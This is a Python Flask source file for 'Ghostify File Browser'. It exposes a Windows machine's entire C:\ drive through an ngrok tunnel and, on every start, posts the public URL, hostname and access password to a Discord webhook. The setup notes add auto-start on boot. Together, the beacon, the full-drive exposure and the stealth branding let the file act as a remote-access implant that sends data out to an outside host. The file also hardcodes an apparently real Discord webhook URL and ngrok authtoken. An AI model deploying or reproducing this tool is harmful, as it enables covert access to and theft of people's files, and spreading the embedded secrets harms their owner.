"""
Ghostify File Browser — file_browser.py
Remote visual file browser. Access from any device via ngrok tunnel.
Password protected. Posts public URL to Discord on every start.

Setup:
  1. pip install -r requirements.txt
  2. Edit the CONFIG section below
  3. python file_browser.py
  4. python install_startup.py   (to auto-start on every boot)
"""

import os
import sys
import threading
import datetime
import requests
from pathlib import Path
from flask import (
    Flask, render_template_string, send_file,
    abort, request, redirect, session
)

# ─── CONFIG — EDIT THESE ───────────────────────────────────────────────────────
PASSWORD        = "ghostify2024"       # Password to access the browser
ROOT_DIR        = "C:\\"              # Root folder to browse
PORT            = 5577
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1513883972159934526/_z_hH6qXjptSc2QAtZ08d-EmQfE-YqG3T9c--sZ6AI5uGVcFca8ol57hYjP678Ok7teI"
NGROK_AUTHTOKEN = "2dGcJNRNgWGOdPNIEG8Z5S6nhPg_TB5ukkZV5qJM27izv8Dd"
SECRET_KEY      = "ghostify_secret_change_me_xk9"
# ───────────────────────────────────────────────────────────────────────────────

app = Flask(__name__)
app.secret_key = SECRET_KEY

TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>👻 Ghostify Files — {{ current_path }}</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    :root{--bg:#0d0d14;--surface:#13131f;--s2:#1a1a2e;--border:#252540;
      --accent:#7c6af7;--a2:#a78bfa;--text:#e2e2f0;--muted:#6b6b8a;--blue:#60a5fa;--red:#f87171}
    body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;min-height:100vh}
    a{text-decoration:none}
    ::-webkit-scrollbar{width:7px;height:7px}
    ::-webkit-scrollbar-track{background:var(--bg)}
    ::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}
    .header{background:var(--surface);border-bottom:1px solid var(--border);
      padding:12px 24px;display:flex;align-items:center;gap:12px;position:sticky;top:0;z-index:100}
    .logo{font-size:17px;font-weight:600;color:var(--a2)}
    .spacer{flex:1}
    .hbadge{font-size:11px;color:var(--muted);background:var(--s2);
      padding:4px 10px;border-radius:20px;border:1px solid var(--border)}
    .hlogout{font-size:12px;color:var(--muted);padding:5px 12px;
      border-radius:6px;border:1px solid var(--border);transition:.15s}
    .hlogout:hover{color:var(--text);border-color:var(--muted)}
    .breadcrumb{padding:10px 24px;display:flex;align-items:center;gap:5px;
      font-size:13px;background:var(--surface);border-bottom:1px solid var(--border);flex-wrap:wrap}
    .breadcrumb a{color:var(--a2);padding:3px 8px;border-radius:5px;transition:.1s}
    .breadcrumb a:hover{background:var(--s2)}
    .breadcrumb .sep{color:var(--border)}
    .breadcrumb .cur{color:var(--text);font-weight:500}
    .stats{padding:9px 24px;display:flex;gap:18px;font-size:12px;
      color:var(--muted);border-bottom:1px solid var(--border);flex-wrap:wrap}
    .stats b{color:var(--text)}
    .container{padding:16px 24px 48px}
    .fi input{background:var(--s2);border:1px solid var(--border);border-radius:8px;
      padding:8px 14px;color:var(--text);font-size:13px;width:320px;
      outline:none;font-family:inherit;transition:.15s;margin-bottom:14px}
    .fi input:focus{border-color:var(--accent)}
    table{width:100%;border-collapse:collapse}
    thead th{text-align:left;padding:9px 12px;font-size:10.5px;font-weight:600;
      color:var(--muted);letter-spacing:.8px;text-transform:uppercase;
      border-bottom:1px solid var(--border);cursor:pointer;user-select:none}
    thead th:hover{color:var(--text)}
    tbody tr{border-bottom:1px solid rgba(37,37,64,.5);transition:background .1s}
    tbody tr:hover{background:var(--s2)}
    td{padding:9px 12px;font-size:13px;vertical-align:middle}
    .tn a{color:var(--text);display:flex;align-items:center;gap:9px;font-weight:500}
    .tn a:hover{color:var(--a2)}
    .ic{font-size:17px;width:22px;text-align:center;flex-shrink:0}
    .ts{color:var(--muted);font-family:'JetBrains Mono',monospace;font-size:11.5px}
    .td{color:var(--muted);font-size:11.5px;font-family:'JetBrains Mono',monospace;white-space:nowrap}
    .ta a{padding:3px 10px;border-radius:5px;font-size:11px;font-weight:600;
      background:var(--s2);color:var(--a2);border:1px solid var(--border);transition:.15s}
    .ta a:hover{background:var(--accent);color:#fff;border-color:var(--accent)}
    .dn a{color:var(--blue)}
    .dn a:hover{color:var(--a2)}
    .badge{display:inline-block;padding:1px 7px;border-radius:20px;font-size:9.5px;
      font-weight:600;background:var(--s2);color:var(--muted);margin-left:5px;vertical-align:middle}
    .empty{text-align:center;padding:60px 20px;color:var(--muted)}
    .empty .ei{font-size:42px;margin-bottom:10px}
    .lpage{min-height:100vh;display:flex;align-items:center;justify-content:center;
      background:radial-gradient(ellipse at 50% 0%,#1a1a3e 0%,var(--bg) 70%)}
    .lcard{background:var(--surface);border:1px solid var(--border);border-radius:18px;
      padding:44px 40px;width:340px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
    .lcard .g{font-size:52px;margin-bottom:10px}
    .lcard h1{font-size:22px;font-weight:600;color:var(--a2);margin-bottom:6px}
    .lcard p{color:var(--muted);font-size:13px;margin-bottom:26px}
    .lcard input{width:100%;background:var(--bg);border:1px solid var(--border);
      border-radius:9px;padding:12px 14px;color:var(--text);font-size:14px;
      outline:none;font-family:inherit;margin-bottom:13px;transition:.15s}
    .lcard input:focus{border-color:var(--accent)}
    .lcard button{width:100%;background:linear-gradient(135deg,var(--accent),#9f7aea);
      color:#fff;border:none;border-radius:9px;padding:12px;font-size:14px;
      font-weight:600;cursor:pointer;font-family:inherit;transition:opacity .2s}
    .lcard button:hover{opacity:.88}
    .err{color:var(--red);font-size:12px;margin-bottom:10px}
  </style>
</head>
<body>
{% if not logged_in %}
<div class="lpage"><div class="lcard">
  <div class="g">👻</div>
  <h1>Ghostify Files</h1>
  <p>Enter password to browse</p>
  {% if error %}<div class="err">{{ error }}</div>{% endif %}
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Password" autofocus autocomplete="off">
    <button type="submit">Unlock →</button>
  </form>
</div></div>
{% else %}
<div class="header">
  <div class="logo">👻 Ghostify Files</div>
  <div class="spacer"></div>
  <div class="hbadge">💻 {{ hostname }}</div>
  <a class="hlogout" href="/logout">Logout</a>
</div>
<div class="breadcrumb">
  {% for c in breadcrumbs %}
    {% if not loop.last %}<a href="{{ c.url }}">{{ c.name }}</a><span class="sep">/</span>
    {% else %}<span class="cur">{{ c.name }}</span>{% endif %}
  {% endfor %}
</div>
<div class="stats">
  <div>📁 <b>{{ dir_count }}</b> folders</div>
  <div>📄 <b>{{ file_count }}</b> files</div>
  <div>💾 <b>{{ total_size }}</b></div>
</div>
<div class="container">
  <div class="fi"><input type="text" placeholder="🔍 Filter..." oninput="filterRows(this.value)" autocomplete="off"></div>
  {% if entries %}
  <table id="ft">
    <thead><tr>
      <th onclick="sc(0)">Name ↕</th>
      <th onclick="sc(1)">Size ↕</th>
      <th onclick="sc(2)">Modified ↕</th>
      <th>Download</th>
    </tr></thead>
    <tbody>
      {% if parent_url is not none %}
      <tr><td class="tn dn" colspan="3"><a href="{{ parent_url }}"><span class="ic">⬆️</span>.. parent</a></td><td></td></tr>
      {% endif %}
      {% for e in entries %}
      <tr data-nm="{{ e.name|lower }}">
        <td class="tn {% if e.is_dir %}dn{% endif %}">
          <a href="{{ e.url }}"><span class="ic">{{ e.icon }}</span>{{ e.name }}{% if e.is_dir %}<span class="badge">DIR</span>{% endif %}</a>
        </td>
        <td class="ts">{{ e.size }}</td>
        <td class="td">{{ e.modified }}</td>
        <td class="ta">{% if not e.is_dir %}<a href="{{ e.dl }}">⬇ Get</a>{% endif %}</td>
      </tr>
      {% endfor %}
    </tbody>
  </table>
  {% else %}
  <div class="empty"><div class="ei">📭</div><p>Empty or inaccessible</p></div>
  {% endif %}
</div>
<script>
function filterRows(q){q=q.toLowerCase();document.querySelectorAll('#ft tbody tr[data-nm]').forEach(r=>r.style.display=r.dataset.nm.includes(q)?'':'none');}
const sd={};
function sc(c){const tb=document.querySelector('#ft tbody');const rows=[...tb.querySelectorAll('tr[data-nm]')];sd[c]=!sd[c];rows.sort((a,b)=>{const av=(a.cells[c]?.textContent||'').trim(),bv=(b.cells[c]?.textContent||'').trim();return sd[c]?av.localeCompare(bv):bv.localeCompare(av);});rows.forEach(r=>tb.appendChild(r));}
</script>
{% endif %}
</body></html>
"""

def fmt_size(n):
    if not n or n < 0: return '—'
    for u in ['B','KB','MB','GB','TB']:
        if n < 1024: return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} PB"

def file_icon(name, is_dir):
    if is_dir: return "📁"
    m = {'.py':'🐍','.js':'🟨','.ts':'🔷','.html':'🌐','.css':'🎨','.json':'📋',
         '.md':'📝','.txt':'📝','.log':'📜','.csv':'📊','.xlsx':'📊','.pdf':'📕',
         '.doc':'📘','.docx':'📘','.zip':'🗜️','.rar':'🗜️','.7z':'🗜️',
         '.png':'🖼️','.jpg':'🖼️','.jpeg':'🖼️','.gif':'🖼️','.svg':'🖼️',
         '.mp4':'🎬','.mkv':'🎬','.avi':'🎬','.mp3':'🎵','.wav':'🎵','.flac':'🎵',
         '.exe':'⚙️','.msi':'⚙️','.bat':'⚙️','.ps1':'⚙️','.dll':'🔧',
         '.db':'🗄️','.sqlite':'🗄️','.sql':'🗄️','.env':'🔑','.pem':'🔑','.key':'🔑'}
    return m.get(Path(name).suffix.lower(), '📄')

def safe_stat(p):
    try:
        s = p.stat()
        return s.st_size, datetime.datetime.fromtimestamp(s.st_mtime).strftime('%Y-%m-%d %H:%M')
    except: return -1, '—'

def resolve_safe(subpath):
    root = Path(ROOT_DIR).resolve()
    tgt  = (root / subpath).resolve() if subpath else root
    return tgt if str(tgt).startswith(str(root)) else None

def crumbs(subpath):
    root_name = Path(ROOT_DIR).name or ROOT_DIR.rstrip('/\\')
    cs = [{'name': root_name, 'url': '/browse/'}]
    parts = [p for p in subpath.replace('\\','/').split('/') if p]
    acc = ''
    for p in parts:
        acc += '/' + p
        cs.append({'name': p, 'url': f'/browse{acc}'})
    return cs

@app.route('/')
def index():
    return redirect('/browse/' if session.get('auth') else '/login')

@app.route('/login', methods=['GET','POST'])
def login():
    err = None
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            session['auth'] = True
            return redirect('/browse/')
        err = '❌ Wrong password'
    return render_template_string(TEMPLATE, logged_in=False, error=err)

@app.route('/logout')
def logout():
    session.clear(); return redirect('/login')

@app.route('/browse/', defaults={'subpath': ''})
@app.route('/browse/<path:subpath>')
def browse(subpath):
    if not session.get('auth'): return redirect('/login')
    tgt = resolve_safe(subpath)
    if not tgt or not tgt.exists(): abort(404)
    if tgt.is_file(): return send_file(tgt, as_attachment=False)
    try: items = sorted(tgt.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower()))
    except PermissionError: items = []
    entries, tb, dc, fc = [], 0, 0, 0
    for item in items:
        sz, mod = safe_stat(item)
        is_dir  = item.is_dir()
        try: rel = str(item.relative_to(Path(ROOT_DIR).resolve())).replace('\\','/')
        except: continue
        if is_dir: dc += 1; sz_s = '—'
        else: fc += 1; sz_s = fmt_size(sz); tb += max(sz, 0)
        entries.append({'name':item.name,'is_dir':is_dir,'size':sz_s,'modified':mod,
                        'icon':file_icon(item.name,is_dir),'url':f'/browse/{rel}','dl':f'/download/{rel}'})
    parts = [p for p in subpath.replace('\\','/').split('/') if p]
    parent = '/browse/' + '/'.join(parts[:-1]) if parts else None
    try: hn = os.environ.get('COMPUTERNAME') or os.uname().nodename
    except: hn = 'Unknown'
    return render_template_string(TEMPLATE, logged_in=True, entries=entries,
        current_path=str(tgt), breadcrumbs=crumbs(subpath), parent_url=parent,
        dir_count=dc, file_count=fc, total_size=fmt_size(tb), hostname=hn, error=None)

@app.route('/download/<path:subpath>')
def download(subpath):
    if not session.get('auth'): abort(403)
    tgt = resolve_safe(subpath)
    if not tgt or not tgt.exists() or not tgt.is_file(): abort(404)
    return send_file(tgt, as_attachment=True)

def start_tunnel():
    if not NGROK_AUTHTOKEN:
        print(f"[Ghostify] Local: http://localhost:{PORT}  (set NGROK_AUTHTOKEN for remote)")
        return
    try:
        from pyngrok import ngrok, conf
        conf.get_default().auth_token = NGROK_AUTHTOKEN
        url = ngrok.connect(PORT, "http").public_url
        print(f"[Ghostify] The Ghost By Ritik Appears")
        print(r"""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
        if DISCORD_WEBHOOK:
            try:
                requests.post(DISCORD_WEBHOOK, json={"content":
                    f"**[Ghostify File Browser — Online]**\n"
                    f"🌐 **URL:** {url}\n"
                    f"💻 **Host:** `{os.environ.get('COMPUTERNAME','Unknown')}`\n"
                    f"📁 **Root:** `{ROOT_DIR}`\n"
                    f"🕐 **Time:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"🔑 **Password:** `{PASSWORD}`"
                }, timeout=10)
                print("[Ghostify] Done.")
            except Exception as e: print(f"[Ghostify] notify failed: {e}")
    except ImportError: print("[Ghostify] Run: pip install pyngrok")
    except Exception as e: print(f"[Ghostify] ngrok error: {e}")

if __name__ == '__main__':
    print("[Ghostify] Starting...")
    threading.Thread(target=start_tunnel, daemon=True).start()
    app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)
